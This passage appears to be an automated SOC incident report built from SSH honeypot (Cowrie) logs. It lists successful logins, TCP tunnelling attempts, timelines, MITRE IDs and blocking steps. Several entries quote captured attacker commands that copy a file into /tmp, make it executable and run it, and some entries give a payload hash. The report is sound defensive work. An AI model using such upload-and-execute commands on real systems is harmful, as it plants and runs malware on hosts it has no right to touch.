- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60678bd2db2

| Field | Detail |
|---|---|
| **Source IP** | `222.117.176[.]58` |
| **First Seen** | 2026-08-08 09:27 |
| **Last Seen** | 2026-08-08 09:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:27:49` | `cowrie.session.connect` |
| `2026-08-08 09:27:49` | `cowrie.client.version` |
| `2026-08-08 09:27:49` | `cowrie.client.kex` |
| `2026-08-08 09:27:51` | `cowrie.login.success` |
| `2026-08-08 09:27:52` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.117.176[.]58` to AbuseIPDB if not already reported
- [ ] Block `222.117.176[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d46014a7a89

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-08 09:27 |
| **Last Seen** | 2026-08-08 09:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:27:57` | `cowrie.session.connect` |
| `2026-08-08 09:27:57` | `cowrie.client.version` |
| `2026-08-08 09:27:57` | `cowrie.client.kex` |
| `2026-08-08 09:27:58` | `cowrie.login.success` |
| `2026-08-08 09:27:59` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43d654ff22e0

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-08 09:35 |
| **Last Seen** | 2026-08-08 09:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:35:30` | `cowrie.session.connect` |
| `2026-08-08 09:35:31` | `cowrie.client.version` |
| `2026-08-08 09:35:31` | `cowrie.client.kex` |
| `2026-08-08 09:35:33` | `cowrie.login.success` |
| `2026-08-08 09:35:34` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a79cb28b2dfc

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-08-08 09:35 |
| **Last Seen** | 2026-08-08 09:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:35:39` | `cowrie.session.connect` |
| `2026-08-08 09:35:39` | `cowrie.client.version` |
| `2026-08-08 09:35:39` | `cowrie.client.kex` |
| `2026-08-08 09:35:40` | `cowrie.login.success` |
| `2026-08-08 09:35:41` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27ddd8230a57

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]188` |
| **First Seen** | 2026-08-08 09:37 |
| **Last Seen** | 2026-08-08 09:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:37:24` | `cowrie.session.connect` |
| `2026-08-08 09:37:25` | `cowrie.client.version` |
| `2026-08-08 09:37:25` | `cowrie.client.kex` |
| `2026-08-08 09:37:27` | `cowrie.login.success` |
| `2026-08-08 09:37:27` | `cowrie.direct-tcpip.request` |
| `2026-08-08 09:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]188` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76fa5e742aa5

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-08-08 09:51 |
| **Last Seen** | 2026-08-08 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/8R5cdKpU` |
| **Download Attempts** | e53619ba943f2780f1ec5022fecd0bf50c38789c5c56ab39b256b7331d014e03 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:51:56` | `cowrie.session.connect` |
| `2026-08-08 09:51:56` | `cowrie.client.version` |
| `2026-08-08 09:51:56` | `cowrie.client.kex` |
| `2026-08-08 09:51:57` | `cowrie.login.success` |
| `2026-08-08 09:51:57` | `cowrie.client.var` |
| `2026-08-08 09:51:58` | `cowrie.session.params` |
| `2026-08-08 09:51:58` | `cowrie.command.input` |
| `2026-08-08 09:51:59` | `cowrie.session.file_download` |
| `2026-08-08 09:51:59` | `cowrie.log.closed` |
| `2026-08-08 09:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07265a43a145

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-08-08 09:51 |
| **Last Seen** | 2026-08-08 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/8R5cdKpU` |
| **Download Attempts** | e53619ba943f2780f1ec5022fecd0bf50c38789c5c56ab39b256b7331d014e03 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:51:56` | `cowrie.session.connect` |
| `2026-08-08 09:51:56` | `cowrie.client.version` |
| `2026-08-08 09:51:56` | `cowrie.client.kex` |
| `2026-08-08 09:51:57` | `cowrie.login.success` |
| `2026-08-08 09:51:58` | `cowrie.client.var` |
| `2026-08-08 09:51:59` | `cowrie.session.params` |
| `2026-08-08 09:51:59` | `cowrie.command.input` |
| `2026-08-08 09:51:59` | `cowrie.session.file_download` |
| `2026-08-08 09:51:59` | `cowrie.log.closed` |
| `2026-08-08 09:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b06bc28225

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-08-08 09:51 |
| **Last Seen** | 2026-08-08 09:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x 8R5cdKpU && bash -c ./8R5cdKpU, ./8R5cdKpU` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:51:59` | `cowrie.session.connect` |
| `2026-08-08 09:51:59` | `cowrie.client.version` |
| `2026-08-08 09:52:00` | `cowrie.client.kex` |
| `2026-08-08 09:52:01` | `cowrie.login.success` |
| `2026-08-08 09:52:01` | `cowrie.client.var` |
| `2026-08-08 09:52:02` | `cowrie.session.params` |
| `2026-08-08 09:52:02` | `cowrie.command.input` |
| `2026-08-08 09:52:02` | `cowrie.command.input` |
| `2026-08-08 09:52:02` | `cowrie.command.failed` |
| `2026-08-08 09:52:02` | `cowrie.log.closed` |
| `2026-08-08 09:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec42c651d557

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-08-08 09:52 |
| **Last Seen** | 2026-08-08 09:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x 8R5cdKpU && bash -c ./8R5cdKpU, ./8R5cdKpU` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:52:00` | `cowrie.session.connect` |
| `2026-08-08 09:52:00` | `cowrie.client.version` |
| `2026-08-08 09:52:00` | `cowrie.client.kex` |
| `2026-08-08 09:52:01` | `cowrie.login.success` |
| `2026-08-08 09:52:02` | `cowrie.client.var` |
| `2026-08-08 09:52:03` | `cowrie.session.params` |
| `2026-08-08 09:52:03` | `cowrie.command.input` |
| `2026-08-08 09:52:03` | `cowrie.command.input` |
| `2026-08-08 09:52:03` | `cowrie.command.failed` |
| `2026-08-08 09:52:03` | `cowrie.log.closed` |
| `2026-08-08 09:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbaad0feaa4e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 09:53 |
| **Last Seen** | 2026-08-08 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:53:20` | `cowrie.session.connect` |
| `2026-08-08 09:53:20` | `cowrie.client.version` |
| `2026-08-08 09:53:20` | `cowrie.client.kex` |
| `2026-08-08 09:53:20` | `cowrie.login.success` |
| `2026-08-08 09:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c883f6fea362

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 09:53 |
| **Last Seen** | 2026-08-08 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:53:20` | `cowrie.session.connect` |
| `2026-08-08 09:53:20` | `cowrie.client.version` |
| `2026-08-08 09:53:20` | `cowrie.client.kex` |
| `2026-08-08 09:53:20` | `cowrie.login.success` |
| `2026-08-08 09:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278a5b8dfbf4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 09:53 |
| **Last Seen** | 2026-08-08 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:53:27` | `cowrie.session.connect` |
| `2026-08-08 09:53:27` | `cowrie.client.version` |
| `2026-08-08 09:53:27` | `cowrie.client.kex` |
| `2026-08-08 09:53:27` | `cowrie.login.success` |
| `2026-08-08 09:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c760bf82052

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 09:53 |
| **Last Seen** | 2026-08-08 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 09:53:27` | `cowrie.session.connect` |
| `2026-08-08 09:53:27` | `cowrie.client.version` |
| `2026-08-08 09:53:27` | `cowrie.client.kex` |
| `2026-08-08 09:53:27` | `cowrie.login.success` |
| `2026-08-08 09:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ec0840bfe9f

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-08-08 10:01 |
| **Last Seen** | 2026-08-08 10:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:01:51` | `cowrie.session.connect` |
| `2026-08-08 10:01:51` | `cowrie.client.version` |
| `2026-08-08 10:01:51` | `cowrie.client.kex` |
| `2026-08-08 10:01:53` | `cowrie.login.success` |
| `2026-08-08 10:01:54` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dae74a2b5f4

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-08 10:06 |
| **Last Seen** | 2026-08-08 10:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:06:32` | `cowrie.session.connect` |
| `2026-08-08 10:06:32` | `cowrie.client.version` |
| `2026-08-08 10:06:32` | `cowrie.client.kex` |
| `2026-08-08 10:06:33` | `cowrie.login.success` |
| `2026-08-08 10:06:34` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d703163e45ef

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-08-08 10:06 |
| **Last Seen** | 2026-08-08 10:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:06:43` | `cowrie.session.connect` |
| `2026-08-08 10:06:44` | `cowrie.client.version` |
| `2026-08-08 10:06:44` | `cowrie.client.kex` |
| `2026-08-08 10:06:45` | `cowrie.login.success` |
| `2026-08-08 10:06:46` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2068a6fce53b

| Field | Detail |
|---|---|
| **Source IP** | `62.201.253[.]23` |
| **First Seen** | 2026-08-08 10:10 |
| **Last Seen** | 2026-08-08 10:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:10:13` | `cowrie.session.connect` |
| `2026-08-08 10:10:13` | `cowrie.client.version` |
| `2026-08-08 10:10:13` | `cowrie.client.kex` |
| `2026-08-08 10:10:15` | `cowrie.login.success` |
| `2026-08-08 10:10:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.253[.]23` to AbuseIPDB if not already reported
- [ ] Block `62.201.253[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d7f0388dca

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 10:11 |
| **Last Seen** | 2026-08-08 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:11:39` | `cowrie.session.connect` |
| `2026-08-08 10:11:39` | `cowrie.client.version` |
| `2026-08-08 10:11:39` | `cowrie.client.kex` |
| `2026-08-08 10:11:39` | `cowrie.login.success` |
| `2026-08-08 10:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af18f06f3ad

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 10:11 |
| **Last Seen** | 2026-08-08 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:11:39` | `cowrie.session.connect` |
| `2026-08-08 10:11:39` | `cowrie.client.version` |
| `2026-08-08 10:11:39` | `cowrie.client.kex` |
| `2026-08-08 10:11:39` | `cowrie.login.success` |
| `2026-08-08 10:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29823c0f7eda

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 10:11 |
| **Last Seen** | 2026-08-08 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:11:40` | `cowrie.session.connect` |
| `2026-08-08 10:11:40` | `cowrie.client.version` |
| `2026-08-08 10:11:40` | `cowrie.client.kex` |
| `2026-08-08 10:11:40` | `cowrie.login.success` |
| `2026-08-08 10:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9622b7057300

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-08 10:11 |
| **Last Seen** | 2026-08-08 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:11:40` | `cowrie.session.connect` |
| `2026-08-08 10:11:40` | `cowrie.client.version` |
| `2026-08-08 10:11:40` | `cowrie.client.kex` |
| `2026-08-08 10:11:40` | `cowrie.login.success` |
| `2026-08-08 10:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9534c9fd6939

| Field | Detail |
|---|---|
| **Source IP** | `88.84.209[.]146` |
| **First Seen** | 2026-08-08 10:11 |
| **Last Seen** | 2026-08-08 10:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:11:45` | `cowrie.session.connect` |
| `2026-08-08 10:11:45` | `cowrie.client.version` |
| `2026-08-08 10:11:45` | `cowrie.client.kex` |
| `2026-08-08 10:11:46` | `cowrie.login.success` |
| `2026-08-08 10:11:47` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.84.209[.]146` to AbuseIPDB if not already reported
- [ ] Block `88.84.209[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd6eb1a23ff

| Field | Detail |
|---|---|
| **Source IP** | `31.41.84[.]98` |
| **First Seen** | 2026-08-08 10:21 |
| **Last Seen** | 2026-08-08 10:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:21:55` | `cowrie.session.connect` |
| `2026-08-08 10:21:55` | `cowrie.client.version` |
| `2026-08-08 10:21:55` | `cowrie.client.kex` |
| `2026-08-08 10:21:56` | `cowrie.login.success` |
| `2026-08-08 10:21:57` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.84[.]98` to AbuseIPDB if not already reported
- [ ] Block `31.41.84[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c44eb342eaa9

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-08 10:22 |
| **Last Seen** | 2026-08-08 10:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:22:06` | `cowrie.session.connect` |
| `2026-08-08 10:22:07` | `cowrie.client.version` |
| `2026-08-08 10:22:07` | `cowrie.client.kex` |
| `2026-08-08 10:22:09` | `cowrie.login.success` |
| `2026-08-08 10:22:09` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b3d3a8be7cf

| Field | Detail |
|---|---|
| **Source IP** | `179.184.218[.]49` |
| **First Seen** | 2026-08-08 10:25 |
| **Last Seen** | 2026-08-08 10:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:25:00` | `cowrie.session.connect` |
| `2026-08-08 10:25:01` | `cowrie.client.version` |
| `2026-08-08 10:25:01` | `cowrie.client.kex` |
| `2026-08-08 10:25:03` | `cowrie.login.success` |
| `2026-08-08 10:25:03` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.218[.]49` to AbuseIPDB if not already reported
- [ ] Block `179.184.218[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a44ae9fd03

| Field | Detail |
|---|---|
| **Source IP** | `111.70.3[.]108` |
| **First Seen** | 2026-08-08 10:25 |
| **Last Seen** | 2026-08-08 10:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:25:09` | `cowrie.session.connect` |
| `2026-08-08 10:25:10` | `cowrie.client.version` |
| `2026-08-08 10:25:10` | `cowrie.client.kex` |
| `2026-08-08 10:25:12` | `cowrie.login.success` |
| `2026-08-08 10:25:13` | `cowrie.direct-tcpip.request` |
| `2026-08-08 10:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.3[.]108` to AbuseIPDB if not already reported
- [ ] Block `111.70.3[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d173293cbc

| Field | Detail |
|---|---|
| **Source IP** | `111.42.60[.]82` |
| **First Seen** | 2026-08-08 10:29 |
